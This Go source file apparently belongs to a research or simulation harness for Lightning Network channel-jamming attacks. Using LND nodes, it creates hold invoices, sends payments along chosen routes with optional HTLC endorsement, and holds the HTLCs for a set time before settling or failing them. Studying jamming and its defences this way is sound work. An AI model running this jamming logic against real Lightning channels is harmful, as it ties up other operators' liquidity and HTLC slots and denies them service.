package main

import (
	"context"
	"sync"
	"time"

	"github.com/btcsuite/btcd/btcutil"
	"github.com/lightninglabs/lndclient"
	"github.com/lightningnetwork/lnd/invoices"
	"github.com/lightningnetwork/lnd/lnrpc"
	"github.com/lightningnetwork/lnd/lnrpc/invoicesrpc"
	"github.com/lightningnetwork/lnd/lnrpc/routerrpc"
	"github.com/lightningnetwork/lnd/lnwire"
)

// Nodes represents the set of nodes that we have on hand.
type Nodes interface {
	GetNode(i int) lndclient.LndServices
}

// JammingHarness holds a set of LND nodes and provides utilites for jamming
// attacks.
type JammingHarness struct {
	LndNodes Nodes

	wg sync.WaitGroup
}

type JammingPaymentReq struct {
	// AmtMsat is the amount for the invoice in millisatoshis.
	AmtMsat lnwire.MilliSatoshi

	// SourceIdx is the LND node that will send the payment.
	SourceIdx int

	// DestIdx is the LND node that will receive the paymetn.
	DestIdx int

	// CLTV delta for the final node.
	FinalCLTV uint64

	// EndorseOutgoing indicates whether the sending node should endorse
	// the payment.
	EndorseOutgoing bool

	// Whether to successfully settle the payment (or fail it).
	Settle bool

	// Instruct the receiving node to wait for this duration before settle.
	SettleWait time.Duration

	// EarlySettle is a channel that when closed, will force the jam payment
	// to be settled/canceled (possibly earlier than its settle wait time).
	EarlySettle chan struct{}
}

type JammingPaymentResp struct {
	// SendFailure represents failure from the sending node.
	SendFailure lnrpc.PaymentFailureReason

	// The set of HTLCs that the invoice was paid with. This may be
	// populated even if the payment failed, as our attacker will choose
	// to cancel payments that could have otherwise succeeded.
	Htlcs []lndclient.InvoiceHtlc

	// Err indicates that an unexpected error occurred.
	Err error
}

// SendPaymentFunc is a function type used to abstract lnd's various send
// payment APIs.
type SendPaymentFunc func(ctx context.Context, inv string) (
	<-chan lndclient.PaymentStatus, <-chan error, error)

// JammingPaymentRoute performs a jamming payment using the route provided.
func (j *JammingHarness) JammingPaymentRoute(ctx context.Context,
	req JammingPaymentReq, route lndclient.QueryRoutesResponse) (
	<-chan JammingPaymentResp, error) {

	endorse := routerrpc.HTLCEndorsement_ENDORSEMENT_FALSE
	if req.EndorseOutgoing {
		endorse = routerrpc.HTLCEndorsement_ENDORSEMENT_TRUE
	}

	sendPaymentClosure := func(ctx context.Context, inv string) (
		<-chan lndclient.PaymentStatus, <-chan error, error) {

		source := j.LndNodes.GetNode(req.SourceIdx)

		b11, err := source.Client.DecodePaymentRequest(ctx, inv)
		if err != nil {
			return nil, nil, err
		}

		// Copy everything because we're re-using this route over and
		// over (hops are common reference, so we just copy everything).
		pmtRoute := lndclient.QueryRoutesResponse{
			TotalTimeLock: route.TotalTimeLock,
			TotalFeesMsat: route.TotalFeesMsat,
			TotalAmtMsat:  route.TotalAmtMsat,
		}

		for _, hop := range route.Hops {
			pmtRoute.Hops = append(pmtRoute.Hops,
				&lndclient.Hop{
					ChannelID:        hop.ChannelID,
					Expiry:           hop.Expiry,
					AmtToForwardMsat: hop.AmtToForwardMsat,
					FeeMsat:          hop.FeeMsat,
					PubKey:           hop.PubKey,
					MppRecord:        hop.MppRecord,
					Metadata:         hop.Metadata,
				},
			)
		}

		// Each invoice we pay will have a different MPP record, so
		// we set it for our set route here.
		pmtRoute.Hops[len(pmtRoute.Hops)-1].MppRecord = &lnrpc.MPPRecord{
			PaymentAddr:  b11.PaymentAddress[:],
			TotalAmtMsat: int64(b11.Value),
		}

		pmtChan, errChan := source.Router.SendToRouteV2(
			ctx,
			lndclient.SendToRouteRequest{
				PaymentHash: b11.Hash,
				Route:       pmtRoute,
				Endorsed:    endorse,
			},
		)

		return pmtChan, errChan, nil
	}

	return j.jammingPayment(ctx, req, sendPaymentClosure)
}

// JammingPayment performs a jamming payment using LND's internal pathfinding.
func (j *JammingHarness) JammingPayment(ctx context.Context,
	req JammingPaymentReq) (<-chan JammingPaymentResp, error) {

	endorse := routerrpc.HTLCEndorsement_ENDORSEMENT_FALSE
	if req.EndorseOutgoing {
		endorse = routerrpc.HTLCEndorsement_ENDORSEMENT_TRUE
	}

	sendPaymentClosure := func(ctx context.Context, inv string) (
		<-chan lndclient.PaymentStatus, <-chan error, error) {

		return j.LndNodes.GetNode(req.SourceIdx).Router.SendPayment(
			ctx,
			lndclient.SendPaymentRequest{
				Invoice:         inv,
				Timeout:         time.Hour,
				MaxFeeMsat:      lnwire.MaxMilliSatoshi,
				EndorseOutgoing: endorse,
			},
		)
	}

	return j.jammingPayment(ctx, req, sendPaymentClosure)
}

// jammingPayment assists in creating a payment that can be used for channel
// jamming:
// - Creates a hold invoice on the target node
// - Pays the invoice using the payment closure provided
// - Optionally holds the HTLCs on the recipient for a wait period.
// - Settles/fails the HTLCs acks as instructed.
//
// It returns a channel that will report the outcome of the payment, along with
// any HTLCs used to pay it.
func (j *JammingHarness) jammingPayment(ctx context.Context,
	req JammingPaymentReq, sendPmt SendPaymentFunc) (
	<-chan (JammingPaymentResp), error) {

	ctx, cancel := context.WithCancel(ctx)

	// Create a channel for our response.
	respChan := make(chan JammingPaymentResp, 1)

	preimage := genPreimage()
	hash := preimage.Hash()

	inv, err := j.LndNodes.GetNode(req.DestIdx).Invoices.AddHoldInvoice(
		ctx,
		&invoicesrpc.AddInvoiceData{
			Value:       req.AmtMsat,
			HodlInvoice: true,
			Hash:        &hash,
			CltvExpiry:  req.FinalCLTV,
		},
	)
	if err != nil {
		cancel()
		return nil, err
	}

	sendTime := time.Now()
	statusChan, pmtErrChan, err := sendPmt(ctx, inv)
	if err != nil {
		cancel()
		return nil, err
	}

	// Setup some channel to track various outcomes, buffering errChan by
	// 2 in case both goroutines error out (we don't have to block / have
	// to consume both).
	errChan := make(chan error, 2)
	invoiceChannel := make(chan []lndclient.InvoiceHtlc, 1)
	paymentChannel := make(chan lnrpc.PaymentFailureReason, 1)

	j.wg.Add(1)
	go func() {
		defer j.wg.Done()

		dest := j.LndNodes.GetNode(req.DestIdx)
		invChan, invErrChan, err := dest.Invoices.SubscribeSingleInvoice(
			ctx, hash,
		)
		if err != nil {
			errChan <- err
			return
		}

		for {
			select {
			case i := <-invChan:
				if i.State != invoices.ContractAccepted {
					continue
				}

				// Only send update / take action when all
				// htlcs have arrived to account for mpp.
				if i.AmtPaid < btcutil.Amount(req.AmtMsat/1000) {
					continue
				}

				now := time.Now()
				target := sendTime.Add(req.SettleWait)

				// Perhaps we want to slow jam, grab our wait
				// time starting from dispatch so that we know
				// no HTLC is held longer than our desired
				// target (give or take time we need to settle).
				wait := target.Sub(now)
				if target.Before(now) {
					wait = 0
				}

				invoiceChannel <- i.Htlcs

				complete := func() {
					var err error
					if req.Settle {
						err = dest.Invoices.SettleInvoice(
							ctx, preimage,
						)
					} else {
						err = dest.Invoices.CancelInvoice(
							ctx, hash,
						)
					}
					if err != nil {
						errChan <- err
						return
					}
				}

				select {
				case <-req.EarlySettle:
					complete()

				case <-time.After(wait):
					complete()

				case <-ctx.Done():
					errChan <- ctx.Err()
					return
				}

			// If the invoice subscription errors out, just relay
			// the error to our top level error channel. Channels
			// are closed on shutdown, so only send an error if
			// non-nil.
			case err := <-invErrChan:
				if err != nil {
					errChan <- err
				}
				return

			case <-ctx.Done():
				errChan <- ctx.Err()
				return
			}
		}
	}()

	// Consume updates from sender so that we know what happened to the
	// payment.
	j.wg.Add(1)
	go func() {
		defer j.wg.Done()

		for {
			select {
			case s := <-statusChan:
				// We don't need to track temporal states.
				if s.State == lnrpc.Payment_FAILED ||
					s.State == lnrpc.Payment_SUCCEEDED {

					paymentChannel <- s.FailureReason

					return
				}

			// Relay stream errors to top level channel. Channels
			// are closed on shutdown so only send if nil.
			case err := <-pmtErrChan:
				if err != nil {
					errChan <- err
				}
				return

			case <-ctx.Done():
				errChan <- ctx.Err()
				return

			}
		}
	}()

	j.wg.Add(1)
	go func() {
		defer j.wg.Done()
		// Cancel our context to clean up any goroutines in the case
		// where we errored out.
		defer cancel()

		var htlcs []lndclient.InvoiceHtlc

		for {
			select {
			// When we get a result from our invoice subscription,
			// we know that the HTLCs have at least reached the
			// final node. We'll exit when the final payment update
			// is recieved by the sender, so we just store our
			// htlcs here for now.
			case i := <-invoiceChannel:
				htlcs = i

			case p := <-paymentChannel:
				switch p {
				// If the payment succeeded, it must have
				// reached the receiving node so we include
				// a report on the HTLCs that we must have
				// received previously, panicing if it's not
				// provided because then our assumption has
				// gone wrong.
				case lnrpc.PaymentFailureReason_FAILURE_REASON_NONE:
					respChan <- JammingPaymentResp{
						Htlcs: htlcs,
					}
					return

				// If a payment failed, it may or may not have
				// reached the recipient node. Exiting here
				// will cancel our context and clean up our
				// invoice subscription if the payment never
				// reached the recipient.
				default:
					respChan <- JammingPaymentResp{
						SendFailure: p,
						Htlcs:       htlcs,
					}
					return
				}

			// Transmit any errors received.
			case e := <-errChan:
				respChan <- JammingPaymentResp{
					Err: e,
				}

				return
			}
		}
	}()

	return respChan, nil
}
